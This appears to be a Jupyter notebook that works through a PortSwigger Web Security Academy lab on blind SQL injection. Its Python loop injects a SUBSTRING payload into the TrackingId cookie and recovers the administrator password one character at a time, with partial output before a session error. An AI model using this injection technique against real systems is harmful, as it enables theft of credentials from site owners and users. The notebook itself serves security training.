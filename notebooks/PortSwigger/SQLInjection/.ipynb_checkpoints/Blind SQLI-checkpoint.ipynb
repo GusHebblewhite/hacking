{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7b81c255",
   "metadata": {},
   "source": [
    "https://portswigger.net/web-security/sql-injection/blind"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "012dfd72",
   "metadata": {},
   "source": [
    "# Blind SQLi with conditional response\n",
    "https://portswigger.net/web-security/sql-injection/blind"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "b6462201",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import re\n",
    "import string\n",
    "from tqdm import tqdm"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "2919e272",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://acec1f3b1e2ef908c0af447500f80015.web-security-academy.net/\"\n",
    "\n",
    "#Create session to track cookies\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#String that may or may not contain \"Welcome back\":\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "efbadfaa",
   "metadata": {},
   "source": [
    "Repeat GET again to observe \"Welcome back\":"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "3c53e3a3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['<section class=\"top-links\">\\n                            <a href=/>Home</a><p>|</p>\\n                            <div>Welcome back!</div><p>|</p>\\n                            <a href=\"/my-account\">My account</a><p>|</p>\\n                        </section>']"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = s.get(URL)\n",
    "re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cc6b14f8",
   "metadata": {},
   "source": [
    "We can put this in a function for more concise syntax"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ba822034",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def is_welcome_back(text):\n",
    "    if text == []:\n",
    "        print(\"Session expired\")\n",
    "        return None\n",
    "    return \"Welcome back\" in re.findall(r\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\", text)[0]\n",
    "\n",
    "is_welcome_back(r.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "eefc3684",
   "metadata": {},
   "source": [
    "Ok now onto the lab itself. So the target data is:\n",
    "```sql\n",
    "SELECT password\n",
    "FROM users\n",
    "WHERE username = 'administrator'\n",
    "```\n",
    "\n",
    "We want to query this, and use SUBSTRING to iterate through the password letter by letter. We're given that the database is looking at the cookie, using a query like:\n",
    "\n",
    "```sql\n",
    "SELECT TrackingId \n",
    "FROM TrackedUsers \n",
    "WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "d98534bb",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 58%|████████████████████████████████████████████████▍                                  | 21/36 [00:34<00:24,  1.66s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "l\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 69%|█████████████████████████████████████████████████████████▋                         | 25/36 [00:46<00:20,  1.84s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lp\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 78%|████████████████████████████████████████████████████████████████▌                  | 28/36 [00:45<00:13,  1.63s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lps\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 28%|███████████████████████                                                            | 10/36 [00:17<00:46,  1.77s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lpsa\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 17%|██████████████                                                                      | 6/36 [00:11<00:55,  1.86s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lpsa6\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 25%|█████████████████████                                                               | 9/36 [00:16<00:48,  1.79s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lpsa69\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 64%|█████████████████████████████████████████████████████                              | 23/36 [00:38<00:21,  1.66s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lpsa69n\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "  6%|████▋                                                                               | 2/36 [00:04<01:19,  2.35s/it]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "lpsa69n2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      " 42%|████████████████████████████████▌                                             | 15/36 [1:02:55<1:28:05, 251.68s/it]\n"
     ]
    },
    {
     "ename": "IndexError",
     "evalue": "list index out of range",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mIndexError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_236/2383888056.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     18\u001b[0m         \u001b[0mr\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mget\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mURL\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcookies\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mrequests\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcookies\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcookiejar_from_dict\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcookies\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     19\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 20\u001b[0;31m         \u001b[0;32mif\u001b[0m \u001b[0mis_welcome_back\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     21\u001b[0m             \u001b[0;31m#New password character found!\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m             \u001b[0mpassword\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0meach_char\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/tmp/ipykernel_236/789110802.py\u001b[0m in \u001b[0;36mis_welcome_back\u001b[0;34m(text)\u001b[0m\n\u001b[1;32m      3\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Session expired\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      4\u001b[0m         \u001b[0;32mreturn\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 5\u001b[0;31m     \u001b[0;32mreturn\u001b[0m \u001b[0;34m\"Welcome back\"\u001b[0m \u001b[0;32min\u001b[0m \u001b[0mre\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfindall\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mr\"<section class=\\\"top-links\\\">[\\s\\S]*?</section>\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      7\u001b[0m \u001b[0mis_welcome_back\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mIndexError\u001b[0m: list index out of range"
     ]
    }
   ],
   "source": [
    "#Reset session\n",
    "s = requests.Session()\n",
    "r = s.get(URL)\n",
    "\n",
    "#Get cookies to modify\n",
    "cookies = s.cookies.get_dict()\n",
    "\n",
    "password = \"\"\n",
    "max_len = 32\n",
    "\n",
    "for char_idx in range(max_len):\n",
    "    found = 0\n",
    "    \n",
    "    for each_char in tqdm(string.digits + string.ascii_lowercase):\n",
    "\n",
    "        injected_query = f\"' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {char_idx + 1}, 1) = '{each_char}' -- \"\n",
    "        cookies[\"TrackingId\"] = injected_query\n",
    "        r = s.get(URL, cookies=requests.cookies.cookiejar_from_dict(cookies))\n",
    "\n",
    "        if is_welcome_back(r.text):\n",
    "            #New password character found!\n",
    "            password += each_char\n",
    "            found = 1\n",
    "            print(password)\n",
    "            break\n",
    "            \n",
    "    if found == 0:\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab557e72",
   "metadata": {},
   "outputs": [],
   "source": [
    "password"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8df40508",
   "metadata": {},
   "source": [
    "Yay!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6affb408",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
